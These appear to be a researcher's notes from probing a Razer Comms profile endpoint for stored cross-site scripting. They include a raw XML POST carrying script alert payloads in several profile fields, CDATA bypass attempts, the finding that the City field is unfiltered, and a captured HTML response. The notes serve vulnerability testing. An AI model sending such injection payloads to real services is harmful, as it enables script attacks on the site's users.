# Profile

Profile is viewed as a webpage.

Outgoing info is in XML, let's see if we can do some XSS there.

Sample profile change request (it's XML).

``` xml
POST /1/user/post HTTP/1.1
Content-Type: application/xml
Host: ecbeta.razerzone.com
Content-Length: 984
Expect: 100-continue
Connection: close

<COP>
  <User>
    <ID>RZR_...</ID>
    <Token></Token>
    <LastName access="friends"><![CDATA[last]]></LastName>
    <FirstName access="friends"><![CDATA[first]]></FirstName>
    <Nickname><![CDATA[<script>alert(1)</script>]]></Nickname>
    <BirthYear access="friends"><![CDATA[1980]]></BirthYear>
    <BirthMonth access="friends"><![CDATA[1]]></BirthMonth>
    <BirthDay access="friends"><![CDATA[1]]></BirthDay>
    <Gender access="friends"><![CDATA[male]]></Gender>
    <City access="friends"><![CDATA[<script>alert(1)</script>]]></City>
    <Country access="friends"><![CDATA[<script>alert(1)</script>]]></Country>
    <UserLanguage access="friends">en</UserLanguage>
    <AboutMe><![CDATA[<script>alert(1)</script>]]></AboutMe>
  </User>
  <ServiceCode>0020</ServiceCode>
</COP>
```

It seems like tags are removed from first and last name (at least).

Tags are not removed in `aboutme`, however they are encoded e.g. `&lt;` and `&gt;`

Sample profile response at the bottom of the page.

Now let's try `CDATA`.

``` xml
<![CDATA[<]]>
<![CDATA[<script>alert(1)</script>]]>
```

Everything inside `CDATA` is taken and then everything between angle brackets are removed in first, last.

For about me, whatever is in CDATA is taken and encoded.

**City is not checked.** Picture available. Normal script alert(1) works.

There's not much to steal here with XSS but still it can be annoying.


**Sample profile response**

``` html
HTTP/1.1 200 OK
Content-Type: text/html
Date: Sat, 23 Apr 2016 05:05:16 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.11
Content-Length: 4838
Connection: Close

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>PROFILE for randomcommsID</title>
  <link href="css/styles.css" rel="stylesheet" type="text/css" />

  <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.3.js"></script>

  <style type="text/css">
    body,td,th {
        font-size: 11px;
        font-family: "Segoe UI";
        margin: 0px;
    }
    html {
        width: 100%;
        height: 100%;
        background-color: #111111;
    }
  </style>

</head>

<script type="text/javascript">
  function animationEnd() {
    if (window.external && ('WebOnPageChanged' in window.external)) {
      window.external.WebOnPageChanged();
    } else {
      /*console.log("WebOnPageChanged does not exists");*/
    }
  }
</script>

<script language="javascript" type="text/javascript">
  $(document).ready(function(){
    $(".fade").hide(0).delay(100).fadeIn(2000);
    $(".fade1").hide(0).delay(200).fadeIn(3000);
    $(".fade2").hide(0).delay(500).fadeIn(1000);
    $(".fade3").hide(0).delay(1000).fadeIn(1000);
    $(".fade4").hide(0).delay(1200).fadeIn(1000);
    $(".fade5").hide(0).delay(1400).fadeIn(1000);
    $(".fade6").hide(0).delay(1600).fadeIn(1000);
    $(".fade7").hide(0).delay(1800).fadeIn(1000);
    $(".fade8").hide(0).delay(2000).fadeIn(1000, function() {
      animationEnd();
    });
  });
</script>

<script type="text/javascript">
  $(document).ready(function() {
    $(".about-sliding-div").show();
    $(".about-slider").show();
    $(".about-slider").click(function() {
      $(".about-sliding-div").slideToggle('fast', function() {
        animationEnd();
      });
    });
  });
</script>

<script type="text/javascript">
  $(document).ready(function(){
    $(".games-sliding-div").show();
    $(".games-slider").show();
    $(".games-slider").click(function(){
      $(".games-sliding-div").slideToggle('fast', function() {
        animationEnd();
      });
    });
  });
</script>

<script type="text/javascript">
  $(document).ready(function(){
    $(".groups-sliding-div").show();
    $(".groups-slider").show();
    $(".groups-slider").click(function() {
      $(".groups-sliding-div").slideToggle('fast', function() {
        animationEnd();   
      });
    });
  });
</script>

<body oncontextmenu="return false;">
<div id="body">
  <div id="section-header" class="about-slider">ABOUT</div>
  <div id="inner-data" class="about-sliding-div">
    <table id="avatar-about-me" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td class='fade' id='status-icon'>
          <img width='6' height='70px' src='images/status/online.png'/>
        </td>
        <td class="fade" id="avatar"><img width="70" height="70" src="images/avatar.png"/></td>
        <td id="name-about-me">
          <div class="fade1 ellipsis_div" id="name">first1 alert(2)last1</div>
          <div class="fade1 ellipsis_div about-wrap" id="about-me">"status1&lt;script&gt;alert(1)&lt;/script&gt;"</div>
        </td>
      </tr>
    </table>
    <div style="margin-top:12px"></div>
    <div id="info-div">
      <table id="info-table">
        <tr id="info-row">
          <td id="info-header" scope="row">Nickname</td>
          <td class="fade2" id="info-data"><div class="ellipsis_div">randomcommsID</div></td>
          <td></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Comms ID</td>
          <td class="fade3" id="info-data-razer-id"><div class="ellipsis_div">randomcommsID</div></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Date of Birth</td>
          <td class="fade4" id="info-data"></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Age</td>
          <td class="fade5" id="info-data"></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Gender</td>
          <td class="fade6" id="info-data"></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Language</td>
          <td class="fade7" id="info-data"><div class="ellipsis_div">English</div></td>
        </tr>
        <tr id="info-row">
          <td id="info-header">Location</td>
          <td class="fade8" id="info-data"><div class="ellipsis_div"></div></td>
        </tr>
      </table>
    </div>
  </div>

  <div style='height:3px'></div>

  <div id="section-header" class="games-slider">RECENTLY PLAYED</div>
<!-- START GAMEHISTORY -->

<!-- END GAMEHISTORY -->

  <div style='height:3px'></div>

  <div id="section-header" class="groups-slider">GROUPS</div>

<!-- START GROUPS -->

<!-- END GROUPS -->

  <div style='height:3px'></div>

<!-- DEBUG

-->

</div>
</body>
</html>

```
